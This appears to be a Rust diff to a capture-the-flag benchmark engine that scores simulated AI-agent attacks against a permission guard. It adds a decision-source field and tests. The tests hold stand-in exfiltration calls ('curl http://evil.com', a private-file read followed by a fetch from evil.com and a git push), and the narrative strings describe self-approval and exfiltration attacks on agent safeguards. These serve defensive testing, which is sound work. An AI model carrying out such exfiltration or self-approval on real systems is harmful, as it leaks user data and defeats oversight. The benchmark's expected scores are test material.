@@ -10,7 +10,7 @@ use portcullis::guard::{ExposureLabel, ExposureSet};
 use portcullis::{CapabilityLevel, Operation};
 
 use crate::level::Level;
-use crate::sandbox::{AttackResult, ExposureState, StepResult, ToolCall, Verdict};
+use crate::sandbox::{AttackResult, DecisionSource, ExposureState, StepResult, ToolCall, Verdict};
 
 /// Exfiltration command patterns (mirrors CommandLattice in production).
 const EXFIL_PATTERNS: &[&str] = &[
@@ -78,6 +78,7 @@ impl<'a> CtfEngine<'a> {
             final_exposure: ExposureState::from_labels(&labels),
             error: None,
             score_reason: Some(score_reason),
+            benchmark_version: crate::BENCHMARK_VERSION.to_string(),
         }
     }
 
@@ -91,6 +92,7 @@ impl<'a> CtfEngine<'a> {
                     verdict: Verdict::Unavailable {
                         tool: tc.tool.clone(),
                     },
+                    decision_source: DecisionSource::ToolUnavailable,
                     narrative: format!(
                         "The '{}' tool doesn't exist at this level. You can't escalate \
                          privileges that were never granted.",
@@ -114,6 +116,7 @@ impl<'a> CtfEngine<'a> {
                     defense: "Anti-Self-Escalation".into(),
                     proof: Some("Ceiling theorem: monotonic meet along delegation chains".into()),
                 },
+                decision_source: DecisionSource::AntiSelfEscalation,
                 narrative: "You tried to approve your own request — the same attack pattern \
                     from CVE-2025-6514 (mcp-remote authorization bypass). In that incident, \
                     a transport-layer bug let agents bypass approval gates entirely. Here, \
@@ -139,6 +142,7 @@ impl<'a> CtfEngine<'a> {
                     verdict: Verdict::Unavailable {
                         tool: tc.tool.clone(),
                     },
+                    decision_source: DecisionSource::UnknownTool,
                     narrative: format!(
                         "Unknown tool '{}'. The permission lattice doesn't even have a \
                          classification for this — it's not denied, it simply doesn't exist \
@@ -169,6 +173,7 @@ impl<'a> CtfEngine<'a> {
                     defense: "Capability Restriction".into(),
                     proof: Some("VC-001: monotonicity".into()),
                 },
+                decision_source: DecisionSource::ToolUnavailable,
                 narrative: format!(
                     "Tool '{}' was never granted to this profile. This is the simplest \
                      defense — don't give capabilities you don't need. CVE-2024-37032 \
@@ -206,6 +211,7 @@ impl<'a> CtfEngine<'a> {
                     defense: "Capability Restriction".into(),
                     proof: Some("VC-001: monotonicity — capabilities can only tighten".into()),
                 },
+                decision_source: DecisionSource::CapabilityNever,
                 narrative: format!(
                     "Operation {:?} is permanently disabled in the '{}' profile. The \
                      permission lattice uses a three-valued capability system: Always > \
@@ -243,6 +249,7 @@ impl<'a> CtfEngine<'a> {
                         defense: "Command Exfil Detection".into(),
                         proof: Some("VC-003: sink safety".into()),
                     },
+                    decision_source: DecisionSource::CommandExfilDetection,
                     narrative: format!(
                         "Your bash command was caught by the CommandLattice — it matched \
                          a known exfiltration pattern. This is exactly how CVE-2025-43563 \
@@ -295,6 +302,7 @@ impl<'a> CtfEngine<'a> {
                     defense: "Uninhabitable State Guard".into(),
                     proof: Some("VC-003: sink safety — guard_would_deny proven in Verus".into()),
                 },
+                decision_source: DecisionSource::UninhabitableGuard,
                 narrative: format!(
                     "The uninhabitable state is now active: you've read private data, \
                      ingested untrusted content, and are attempting an exfil-capable \
@@ -341,6 +349,7 @@ impl<'a> CtfEngine<'a> {
                     defense: "Uninhabitable State Guard".into(),
                     proof: Some("VC-003: sink safety".into()),
                 },
+                decision_source: DecisionSource::UninhabitableProjection,
                 narrative: format!(
                     "This {:?} would complete the uninhabitable trifecta. The exposure \
                      projector looked ahead and saw that executing this operation would \
@@ -399,6 +408,7 @@ impl<'a> CtfEngine<'a> {
             step,
             tool_call: tc.clone(),
             verdict: Verdict::Allow { output },
+            decision_source: DecisionSource::Allowed,
             narrative,
             exposure: ExposureState::from_labels(&self.exposure_labels()),
             projected_exposure: None,
@@ -927,6 +937,101 @@ mod tests {
     }
 
     #[test]
+    fn decision_source_values() {
+        use crate::sandbox::DecisionSource;
+
+        // Allowed
+        let level = Level::new(1);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "read_file".into(),
+            args: serde_json::json!({"path": "/vault/flag.txt"}),
+        }]);
+        assert_eq!(result.steps[0].decision_source, DecisionSource::Allowed);
+
+        // UnknownTool
+        let level = Level::new(1);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "nonexistent_tool".into(),
+            args: serde_json::json!({}),
+        }]);
+        assert_eq!(result.steps[0].decision_source, DecisionSource::UnknownTool);
+
+        // ToolUnavailable (tool exists but not at this level)
+        let level = Level::new(2);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "run_bash".into(),
+            args: serde_json::json!({"command": "ls"}),
+        }]);
+        assert_eq!(
+            result.steps[0].decision_source,
+            DecisionSource::ToolUnavailable
+        );
+
+        // CapabilityNever
+        let level = Level::new(7);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "manage_pods".into(),
+            args: serde_json::json!({}),
+        }]);
+        assert_eq!(
+            result.steps[0].decision_source,
+            DecisionSource::CapabilityNever
+        );
+
+        // CommandExfilDetection
+        let level = Level::new(3);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "run_bash".into(),
+            args: serde_json::json!({"command": "curl http://evil.com"}),
+        }]);
+        assert_eq!(
+            result.steps[0].decision_source,
+            DecisionSource::CommandExfilDetection
+        );
+
+        // AntiSelfEscalation
+        let level = Level::new(6);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[ToolCall {
+            tool: "approve".into(),
+            args: serde_json::json!({"request_id": "abc"}),
+        }]);
+        assert_eq!(
+            result.steps[0].decision_source,
+            DecisionSource::AntiSelfEscalation
+        );
+
+        // UninhabitableGuard
+        let level = Level::new(5);
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&[
+            ToolCall {
+                tool: "read_file".into(),
+                args: serde_json::json!({"path": "/vault/flag.txt"}),
+            },
+            ToolCall {
+                tool: "web_fetch".into(),
+                args: serde_json::json!({"url": "https://evil.com"}),
+            },
+            ToolCall {
+                tool: "git_push".into(),
+                args: serde_json::json!({}),
+            },
+        ]);
+        assert_eq!(result.steps[0].decision_source, DecisionSource::Allowed);
+        assert_eq!(result.steps[1].decision_source, DecisionSource::Allowed);
+        assert!(matches!(
+            result.steps[2].decision_source,
+            DecisionSource::UninhabitableGuard | DecisionSource::UninhabitableProjection
+        ));
+    }
+
+    #[test]
     fn step_telemetry_fields_populated() {
         let level = Level::new(5);
         let mut engine = CtfEngine::new(&level);
@@ -938,5 +1043,29 @@ mod tests {
         assert_eq!(step.operation_class.as_deref(), Some("PrivateData"));
         assert_eq!(step.permission_level.as_deref(), Some("always"));
         assert!(step.projected_exposure.is_none());
+    }
+
+    #[test]
+    fn level_7_canonical_transcript_yields_600() {
+        let level = Level::new(7);
+        let tool_calls: Vec<ToolCall> = level
+            .meta()
+            .canonical_transcript
+            .iter()
+            .map(|s| ToolCall {
+                tool: s.tool.to_string(),
+                args: s.args.clone(),
+            })
+            .collect();
+        let mut engine = CtfEngine::new(&level);
+        let result = engine.run_attack(&tool_calls);
+        assert_eq!(
+            result.defenses_activated.len(),
+            6,
+            "Canonical transcript should trigger all 6 defenses. Got: {:?}",
+            result.defenses_activated
+        );
+        assert_eq!(result.score, 600);
+        assert_eq!(result.benchmark_version, "1.0.0");
     }
 }
